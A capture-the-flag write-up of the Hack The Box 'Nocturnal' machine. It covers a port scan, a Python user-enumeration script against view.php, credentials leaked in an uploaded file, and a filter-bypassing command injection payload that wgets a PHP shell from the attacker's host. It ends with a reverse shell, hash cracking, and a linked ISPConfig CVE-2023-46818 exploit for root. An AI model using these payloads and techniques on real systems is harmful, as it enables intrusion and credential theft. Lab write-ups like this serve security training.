------------

### CTF: Hackthebox
### Lab-: Nocturnal

------------

![image](https://github.com/user-attachments/assets/21312129-1342-497b-b9f4-756c0eb31af5)

-------------
- Rustscan's output-:

```bash
❯ rustscan -a nocturnal.htb -- -Pn -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/sensei/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.64:22
Open 10.10.11.64:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-25 19:01 WAT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:01
Completed NSE at 19:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:01
Completed NSE at 19:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:01
Completed NSE at 19:01, 0.00s elapsed
Initiating Connect Scan at 19:01
Scanning nocturnal.htb (10.10.11.64) [2 ports]
Discovered open port 22/tcp on 10.10.11.64
Discovered open port 80/tcp on 10.10.11.64
Completed Connect Scan at 19:01, 0.36s elapsed (2 total ports)
Initiating Service scan at 19:01
Scanning 2 services on nocturnal.htb (10.10.11.64)
Completed Service scan at 19:01, 6.87s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.64.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:01
Completed NSE at 19:01, 12.73s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:01
Completed NSE at 19:01, 1.18s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:01
Completed NSE at 19:01, 0.00s elapsed
Nmap scan report for nocturnal.htb (10.10.11.64)
Host is up, received user-set (0.36s latency).
Scanned at 2025-04-25 19:01:31 WAT for 22s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpf3JJv7Vr55+A/O4p/l+TRCtst7lttqsZHEA42U5Edkqx/Kb8c+F0A4wMCVOMqwyR/PaMdmzAomYGvNYhi3NelwIEqdKKnL+5svrsStqb9XjyShPD9SQK5Su7xBt+/TfJyJFRcsl7ZJdfc6xnNHQITvwa6uZhLsicycj0yf1Mwdzy9hsc8KRY2fhzARBaPUFdG0xte2MkaGXCBuI0tMHsqJpkeZ46MQJbH5oh4zqg2J8KW+m1suAC5toA9kaLgRis8p/wSiLYtsfYyLkOt2U+E+FZs4i3vhVxb9Sjl9QuuhKaGKQN2aKc8ItrK8dxpUbXfHr1Y48HtUejBj+AleMrUMBXQtjzWheSe/dKeZyq8EuCAzeEKdKs4C7ZJITVxEe8toy7jRmBrsDe4oYcQU2J76cvNZomU9VlRv/lkxO6+158WtxqHGTzvaGIZXijIWj62ZrgTS6IpdjP3Yx7KX6bCxpZQ3+jyYN1IdppOzDYRGMjhq5ybD4eI437q6CSL20=
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLcnMmaOpYYv5IoOYfwkaYqI9hP6MhgXCT9Cld1XLFLBhT+9SsJEpV6Ecv+d3A1mEOoFL4sbJlvrt2v5VoHcf4M=
|   256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIASsDOOb+I4J4vIK5Kz0oHmXjwRJMHNJjXKXKsW0z/dy
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Welcome to Nocturnal
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Port 80 presents a web page,I created an account and signed in.The site allows us to view our file and upload files.

![image](https://github.com/user-attachments/assets/33cb4383-1341-4732-b61e-ffcac5a1e6f0)

- I also noticed that `view.php` allows us to read files based on a username.I noticed that we can enumerate users and also access their files.I tried for admin and didn't get his files.

![image](https://github.com/user-attachments/assets/d00fb89e-5fa5-4481-8c4c-b4a1ad485969)

- I wrote a script to enumerate users-:

```python
#! /usr/bin/env python3
import requests

def openWordlists() -> list:
    wordlist = open("/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt","r").read().split("\n")
    return wordlist

def main():
    headers = {"Cookie":"PHPSESSID=<cookie>"}
    wordlist = openWordlist()
    for username in wordlist:
        data = {"username":username,"file":"<file>"}
        url = "http://nocturnal.htb/view.php"
        data = requests.get(url+f"?username={username}&password=<file uploaded>",data,headers=headers).text
        if "User not found." not in data:
            print(f"[+]{username}-:found....!!")

if __name__ == "__main__":
    main()
```

- The script discovered a new user `Amanda`.

![image](https://github.com/user-attachments/assets/50581957-45bb-46b7-a955-c6148788564f)

- User `Amanda` has a file uploaded name `privacy.odt`.

![image](https://github.com/user-attachments/assets/e7b24a5d-2895-4aa7-83fa-7e61bbdf2f47)

- The odt file contains the password for user `Amanda`.

![image](https://github.com/user-attachments/assets/6676e8e6-225b-4866-a672-4afcfe2ca148)

- User `Amanda` has access to the admin panel.

![image](https://github.com/user-attachments/assets/8cf499d5-3b71-4519-9e49-88e7e10eff34)

- We can also read the source code.I read the source code of admin.php and spotted a command injection vulnerability but with filters.The `$command` variable is vulnerable.

```php
f (isset($_POST['backup']) && !empty($_POST['password'])) {
    $password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';
       
        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
        
        $descriptor_spec = [
            0 => ["pipe", "r"], // stdin
            1 => ["file", $logFile, "w"], // stdout
            2 => ["file", $logFile, "w"], // stderr
        ];
```

- I bypassed the filters with the aid of `tab and the  \n newline char`.The payload below  uploads a php shell file into the  server using `wget`.

```bash
%0awget%09http://10.10.14.110:8002/shell.php%0a>#
```

![image](https://github.com/user-attachments/assets/e609423f-159e-40df-833d-59384d134b87)

- RCE-:

![image](https://github.com/user-attachments/assets/60224c1d-8176-4ead-8547-8c93225e7e44)


- Revshell as www-data-:

![image](https://github.com/user-attachments/assets/6ec77328-13ac-431e-b7b0-5f2daefa246b)

- I noticed a sqlite3 db used to store hashes for the web page.

![image](https://github.com/user-attachments/assets/3fe34ae7-5bd7-4fde-bed9-32c1512a883d)

- I cracked the hash for user `tobias`.

![image](https://github.com/user-attachments/assets/2a5b751b-a5c7-423a-99c5-7a43ba6b5b20)

- User Tobias-:

![image](https://github.com/user-attachments/assets/9114a28a-488c-4dac-abbf-417ca4bbb8d8)

----------------

### PRIVESC WITH ISPCONFIG

-----------------

- I ran `netstat -antp` and noticed a service running internally on port 8080.

![image](https://github.com/user-attachments/assets/81965b0d-499f-408f-af16-f48206c9c8f0)

- I port forwarded it with `ssh`.

![image](https://github.com/user-attachments/assets/038f5f9d-7910-4436-8f06-1194462c40e5)

- The service was used to host the php framework `ispconfig`.I accessed the site with `admin:<tobias' password>`.

![image](https://github.com/user-attachments/assets/38043403-a308-4e99-8e4d-9a6e6f7e6e42)

- I discovered a [POC](https://raw.githubusercontent.com/ajdumanhug/CVE-2023-46818/refs/heads/main/CVE-2023-46818.py) for the framework and got `RCE` as root on the server.

![image](https://github.com/user-attachments/assets/49ab02f3-a111-49d6-8788-e11b772bdad4)

- Root-:

![image](https://github.com/user-attachments/assets/e93286bb-0d19-4d44-a84d-f52edf87a246)

----------------

### THANKS FOR READING

-----------------


















